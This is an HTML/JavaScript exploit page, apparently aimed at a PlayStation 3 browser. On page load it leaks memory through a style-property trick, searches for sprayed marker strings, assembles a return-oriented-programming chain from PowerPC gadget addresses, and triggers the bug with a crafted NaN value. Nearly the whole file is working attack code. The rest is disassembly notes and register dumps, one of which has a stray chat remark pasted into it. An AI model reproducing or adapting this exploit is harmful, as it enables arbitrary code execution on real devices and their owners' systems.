<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	//dbg("hexh2bin str half: " + str);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	//dbg("hexh2bin unescape str: " + a2hex(unescape(str)));
	return unescape(str);
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,pattern,len)
{
	try
	{
		while (1)
		{
			var search_base = 0x80200000;
			var search_size = 0x0027500;
			
			var dat = readMemory(search_base, search_size);
			
			// move past "local("
			dat = dat.substr(6, search_size);
			
			// loop for tag
			for (var i = 0; i < (search_size*2); i += 0x10)
			//for (var i = 0; i < (20000*0x10); i += 0x10)
			{
				if (i > 20000*0x10) {return 0;}
				
				/*
				if (dat.charCodeAt(i/2).toString(16) !== "0") {
					dbg("Not Matched at 0x" + i.toString(16) + ": " + dat.charCodeAt(i/2).toString(16));
				}
				*/
				
				if (dat.charCodeAt(i/2) == pattern)
				{
					//dbg("Matched at 0x" + i.toString(16) + ": " + dat.charCodeAt(i/2).toString(16));
					
					var match = 0;
					
					// loop next 5 bits
					for (var k = 0; k < len; k+=2)
					{
						// convert to string
						if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
						{
							//dbg("Not Matched at 0x" + i.toString(16) + ": " + dat.charCodeAt(i/2).toString(16));
							break;
						}
						// increment match
						match += 2;
					}
					
					// we got a complete match
					if (match == len)
					{
						//dbg("Matched at 0x" + i.toString(16) + ": " + dat.charCodeAt(i/2).toString(16));
						
						// hold exploit addr
						var exploit_addr = search_base + i + 2;
						
						// display the exploit address
						dbg("Found " + name + " at: " + exploit_addr.toString(16));
						//dbg("Loop: "+(i/0x10));
						dat=null;
						return exploit_addr;
					}
				}
			}
			dat=null;			
		}
		dbg("string var could not be located in search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,jump_2,jump_1,j1,jp,rwx_base,future_base;
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var rwx_base_addr=0;
		var future_base_addr=0;
		var rwx_base_bytes=0x02F70000;
		var future_base_bytes=0xCAFEBABE;
        var trigger_state = false;
				
		dbg("Processing gadget string.. Searching for valid offset....");			
		do{
		
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown [sys_sm_ring_buzzer   + sys_sm_shutdown ]
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// Working, well it does the syscalls
		//gadget =  unescape("\u7E2F\u000C\u6740\u7E2F"); // sys_sm_shutdown 
		//gadget =  unescape("\u7E2F\u0061\u04E0\u7E2F"); // sys_process_exit 
		
		
		
		/*
		00010B24 E80B0010 ld         r0,0x10(r11)                  03 (00010B20) REG PIPE LSU
		00010B28 7C0803A6 mtspr      lr,r0                         01 (00010B24) REG
		00010B2C EBEBFFF8 ld         r31,-0x8(r11)
		00010B30 7D615B78 mr         r1,r11
		00010B34 4E800020 blr 
		*/
		// goes into infinite loop
		//gadget =  unescape("\u7E2F\u0001\u0B28\u7E2F"); // 0x0000000000010b28 : mtlr r0 ; ld r31, -8(r11) ; mr r1, r11 ; blr // 7c0803a6ebebfff87d615b784e800020
		
		
		/*
		004AD8B8 3929F070 addi       r9,r9,-0xF90
		004AD8BC 917D0030 stw        r11,0x30(r29)                  PIPE
		004AD8C0 913D0000 stw        r9,0x0(r29)
		004AD8C4 981D0020 stb        r0,0x20(r29)                   PIPE
		004AD8C8 917D002C stw        r11,0x2C(r29)
		004AD8CC E80100A0 ld         r0,0xA0(r1)                    PIPE
		004AD8D0 EBA10078 ld         r29,0x78(r1)
		004AD8D4 38210090 addi       r1,r1,0x90
		004AD8D8 7C0803A6 mtspr      lr,r0
		004AD8DC 4E800020 blr 
		*/
		//gadget =  unescape("\u7E2F\u004A\uD8B8\u7E2F"); // 0x00000000004ad8b8 : addi r9, r9, -0xf90 ; stw r11, 0x30(r29) ; stw r9, 0(r29) ; stb r0, 0x20(r29) ; stw r11, 0x2c(r29) ; ld r0, 0xa0(r1) ; ld r29, 0x78(r1) ; addi r1, r1, 0x90 ; mtlr r0 ; blr // 3929f070917d0030913d0000981d0020917d002ce80100a0eba10078382100907c0803a64e800020
		
		
		/*
		0060A0A4 78690020 clrldi     r9,r3,32 // r9 gets set to 000000008FD8D6C0
		0060A0A8 7C6B1B78 mr         r11,r3 // r11 gets set to 000000008FD8D6C0
		0060A0AC 900901DC stw        r0,0x1DC(r9) // stores r0 (000000000060A0A4) address to 8FD8D89C
		0060A0B0 E8010090 ld         r0,0x90(r1) // loads 000000008FD8D700 value from this address 8FD8D650 into r0
		0060A0B4 79630020 clrldi     r3,r11,32 // r3 gets set to 000000008FD8D6C0
		0060A0B8 EBC10070 ld         r30,0x70(r1) // loads value 802DAC0800000000 from this address 8FD8D630 into r30
		0060A0BC EBE10078 ld         r31,0x78(r1) // loads value 0000000000000000 from this address 8FD8D638 into r31
		0060A0C0 7C0803A6 mtspr      lr,r0 // link register changes from 0000000003A9F7E8 to 000000008FD8D700
		0060A0C4 38210080 addi       r1,r1,0x80 // 000000008FD8D5C0+0x80 from 8FD8D640 changes r1 to 000000008FD8D640
		0060A0C8 4E800020 blr 
		*/
		//gadget =  unescape("\u7E2F\u0060\uA0A4\u7E2F"); // 0x000000000060a0a4 : clrldi r9, r3, 0x20 ; mr r11, r3 ; stw r0, 0x1dc(r9) ; ld r0, 0x90(r1) ; clrldi r3, r11, 0x20 ; ld r30, 0x70(r1) ; ld r31, 0x78(r1) ; mtlr r0 ; addi r1, r1, 0x80 ; blr // 786900207c6b1b78900901dce801009079630020ebc10070ebe100787c0803a6382100804e800020
		
		
		/*
		006052B0 E8010010 ld         r0,0x10(r1)
		006052B4 7C6307B4 extsw      r3,r3
		006052B8 7C0803A6 mtspr      lr,r0                         01 (006052B0) REG
		006052BC 4E800020 blr 
		*/
		//gadget =  unescape("\u8120\u0060\u52B0\u8120"); // 0x00000000006052b0 : ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr ; li r3, 0 ; blr // e80100107c6307b47c0803a64e800020386000004e800020
		
		
		/*
		00010B24 E80B0010 ld         r0,0x10(r11)                  03 (00010B20) REG PIPE LSU
		00010B28 7C0803A6 mtspr      lr,r0                         01 (00010B24) REG
		00010B2C EBEBFFF8 ld         r31,-0x8(r11)
		00010B30 7D615B78 mr         r1,r11
		00010B34 4E800020 blr 
		*/
		
		/*
		 r0=0000000000010B24        r8=0000000000000001       r16=0000000000000000       r24=FFFFFFFE802004E2
		 r1=000000008FD8D5C0        r9=00000000802194F2       r17=0000000000000000       r25=000000008FD8E3C8
		 r2=000000008FD0761D       r10=00000000802004E2       r18=FFFFFFFFFFFFFFFE       r26=000000008039EB80
		 r3=000000008FD8D6C0       r11=00000000802199F2       r19=00000000801806B8       r27=00000000803D8668
		 r4=00000000802004E2       r12=0000000088088044       r20=0000000000000001       r28=000000008FD8D6C0
		 r5=000000008F780180       r13=000000001000D420       r21=000000008028EE4C       r29=000000008FD8D6C4
		 r6=FFFFFFFE802004E2       r14=0000000000000000       r22=000000008FD8E3C8       r30=0000000002D19388
		 r7=000000008FD8E3C8       r15=802BF26000000000       r23=0000000000000000       r31=000000008FD8D6C0

		xer=0000000020000000       ctr=0000000000010B24        lr=0000000003A9F7E8     fpscr=A2001100

		 cr=88088042               cr0=LT cr1=LT cr2=   cr3=LT cr4=LT cr5=   cr6=GT cr7=EQ

		 pc=0000000000010B24           ld   r0,0x10(r11)

		 TRAP

		 */
		//gadget =  unescape("\u8FD0\u0001\u0B24\u8FD0"); // 0x0000000000010b24
		
		
		
		
		
		/*
		0337150C 54A5103A slwi       r5,r5,2                       02 (03371508) REG
		03371510 389C0004 addi       r4,r28,0x4
		03371514 38A5FFFC addi       r5,r5,-0x4                     PIPE
		03371518 7FA3EB78 mr         r3,r29
		0337151C 78840020 clrldi     r4,r4,32                       PIPE
		03371520 54A5003A clrrwi     r5,r5,2
		03371524 480E06C1 bl         0x03451BE4                    08
		03371528 E8410028 ld         r2,0x28(r1)
		0337152C 813F0000 lwz        r9,0x0(r31)                    PIPE
		03371530 5529103A slwi       r9,r9,2                       01 (0337152C) REG
		03371534 38000000 li         r0,0x0                         PIPE
		03371538 7D29E214 add        r9,r9,r28
		0337153C 3929FFFC addi       r9,r9,-0x4                    01 (03371538) REG PIPE
		03371540 79290020 clrldi     r9,r9,32                      01 (0337153C) REG
		03371544 90090000 stw        r0,0x0(r9)                    03 (03371540) REG PIPE LSU
		03371548 817F0000 lwz        r11,0x0(r31)you're just breaking my heart man lol
		0337154C 396BFFFF addi       r11,r11,-0x1                  02 (03371548) REG
		03371550 917F0000 stw        r11,0x0(r31)                  03 (0337154C) REG LSU
		03371554 E80100A0 ld         r0,0xA0(r1)                    PIPE
		03371558 7FC307B4 extsw      r3,r30
		0337155C EB810070 ld         r28,0x70(r1)
		03371560 EBA10078 ld         r29,0x78(r1)
		03371564 7C0803A6 mtspr      lr,r0
		03371568 EBC10080 ld         r30,0x80(r1)
		0337156C EBE10088 ld         r31,0x88(r1)                   PIPE
		03371570 38210090 addi       r1,r1,0x90
		03371574 4E800020 blr
		*/
		//gadget =  unescape("\u8FD0\u0337\u150C\u8FD0"); // _stdc_memmove 0x0337150C
		
		
		
		
		
		//gadget =  unescape("\u8FD0\u0017\u867C\u8FD0"); // 0x000000000017867c : li r3, 0 ; mtlr r0 ; blr // 386000007c0803a64e800020
		
		
		
		
		//gadget =  unescape("\u8FD0\u000C\uEFE0\u8FD0"); // 0x00000000000cefe0 : mtlr r0 ; blr ; blr // 7c0803a64e8000204e800020
		
		
		//gadget =  unescape("\u8FD0\u0001\u0228\u8FD0"); // 0x0000000000010228 : blr // 4e800020
		//gadget =  unescape("\u8FD0\u0001\u83E8\u8FD0"); // 0x00000000000183e8 : blr ; blr // 4e8000204e800020
		
		/*
		0035D66C 801D00C8 lwz        r0,0xC8(r29)                   PIPE
		0035D670 813D00B4 lwz        r9,0xB4(r29)
		0035D674 817D00B8 lwz        r11,0xB8(r29)                  PIPE
		0035D678 815D00BC lwz        r10,0xBC(r29)
		0035D67C 811D00C0 lwz        r8,0xC0(r29)                   PIPE
		0035D680 80FD00C4 lwz        r7,0xC4(r29)
		0035D684 901C00C8 stw        r0,0xC8(r28)                   PIPE
		0035D688 E80100C0 ld         r0,0xC0(r1)
		0035D68C 913C00B4 stw        r9,0xB4(r28)                   PIPE
		0035D690 917C00B8 stw        r11,0xB8(r28)
		0035D694 7C0803A6 mtspr      lr,r0
		0035D698 915C00BC stw        r10,0xBC(r28)
		0035D69C 911C00C0 stw        r8,0xC0(r28)                   PIPE
		0035D6A0 90FC00C4 stw        r7,0xC4(r28)
		0035D6A4 EB010070 ld         r24,0x70(r1)                   PIPE
		0035D6A8 EB210078 ld         r25,0x78(r1)
		0035D6AC EB410080 ld         r26,0x80(r1)                   PIPE
		0035D6B0 EB610088 ld         r27,0x88(r1)
		0035D6B4 EB810090 ld         r28,0x90(r1)                   PIPE
		0035D6B8 EBA10098 ld         r29,0x98(r1)
		0035D6BC 382100B0 addi       r1,r1,0xB0
		0035D6C0 4E800020 blr 
		*/
		//gadget =  unescape("\u8FD0\u0035\uD66C\u8FD0"); // 0035D66C
		
		
		
		// sys_fs_mkdir 
		//gadget =  unescape("\u8FD0\u0062\uB17C\u8FD0"); // 0x000000000062b17c : lwz r4, 0x18(r3) ; li r11, 0x32b ; lwz r3, 0xc(r3) ; extsw r4, r4 ; sc ; ld r0, 0x10(r1) ; stw r3, 8(r29) ; mtlr r0 ; ld r29, -0x18(r1) ; blr // 808300183960032b8063000c7c8407b444000002e8010010907d00087c0803a6eba1ffe84e800020
		
		
		
		//gadget =  unescape("\u8FD0\u0061\uEC14\u8FD0"); // 0x000000000061ec14 : li r11, 0x1cd ; mflr r0 ; std r0, 0x10(r1) ; sc ; ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr // 396001cd7c0802a6f801001044000002e80100107c6307b47c0803a64e800020
		
		
		
		gadget =  unescape("\u8FD0\u0060\u961C\u8FD0"); // 0x000000000060961c : li r11, 0x144 ; mflr r0 ; std r0, 0x10(r1) ; sc ; ld r0, 0x10(r1) ; extsw r3, r3 ; mtlr r0 ; blr // 396001447c0802a6f801001044000002e80100107c6307b47c0803a64e800020 // sys_memory_container_create 
		
		
		//gadget_addr = findExploit("gadget",gadget,0x7E2F,0x4); // goes into r2 lo shifted
		gadget_addr = findExploit("gadget",gadget,0x8FD0,0x4); // goes into r2 lo shifted
		
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");	
		do{
		//jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u2A2F");
		//jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4343\u4343\u7E2F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4242\u4242\u7E2F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u7E2F");
		jump_2 = unescape("\u4343\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4343\u4343\u7A2F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4242\u4242\u7A1F\uaaaa\uaaaa\uaaaa\uaaaa\uaaaa\u4141\u4141\u7E2F");
		//dbg(a2hex(jump_2));
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));
		
		// Write RWX Base Address In jump_2
		jump_2 = jump_2.replaceAt(0x22 / 2, hexh2bin((rwx_base_bytes) >> 16));
		jump_2 = jump_2.replaceAt(0x24 / 2, hexh2bin(rwx_base_bytes));
		
		// Write Future Base Address In jump_2
		jump_2 = jump_2.replaceAt(0x12 / 2, hexh2bin((future_base_bytes) >> 16));
		jump_2 = jump_2.replaceAt(0x14 / 2, hexh2bin(future_base_bytes));
		
		jp = jump_2.replaceAt(0x00/2,hexh2bin(0x7E2F));
		
		// Find jump_2 Address
		jump_2_addr = findExploit("jp",jp,0x7E2F,0x1C);
		
		}
		while(jump_2_addr==0);

		// Write Additional Addresses In jump_2
		dbg("Processing Additional Jump Addresses In jump_2....");
		rwx_base_addr = jump_2_addr + 0x20 / 2;
		future_base_addr = jump_2_addr + 0x20 / 2 + 0x10 / 2 + 0x8;
		
		// Finding Jump 1
		dbg("Processing jump_1 string.. Searching for valid offset....");
		do{
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));
		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		dbg("gadget: "+a2hex(gadget));
		dbg("gadget variable offset: "+gadget_addr.toString(16));
		dbg("jump_2: "+a2hex(jump_2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		dbg("gadget jump_1: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("rwx_base variable offset: "+rwx_base_addr.toString(16));	
		dbg("future_base variable offset: "+future_base_addr.toString(16));	
		dbg("Triggering exploit....");
		
		// Show address info
		alert("Exploit Details\nPress OK To Proceed....\n" + "\ngadget offset (r11): " + gadget_addr.toString(16) + "\njump_2_addr offset (r9): " + jump_2_addr.toString(16) + "\njump_1_addr offset (r4 & r10): " + jump_1_addr.toString(16) + "\nrwx_base_addr offset: " + rwx_base_addr.toString(16) + "\nfuture_base_addr offset: " + future_base_addr.toString(16));


		// Check trigger state
		if (confirm('Proceed To Trigger?')) {
			//alert('trigger ' + jump_1_addr.toString(16));
			trigger(jump_1_addr);
			trigger_state = true;
		} else {
			trigger_state = false
		}

		// Refresh Page?
		if (!trigger_state) {
			if (confirm('Refresh Page?')) {
				location.reload();
			} else {
				return;
			}
		}

		trigger_state = false;
		
		//trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}

</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears, reload page because exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
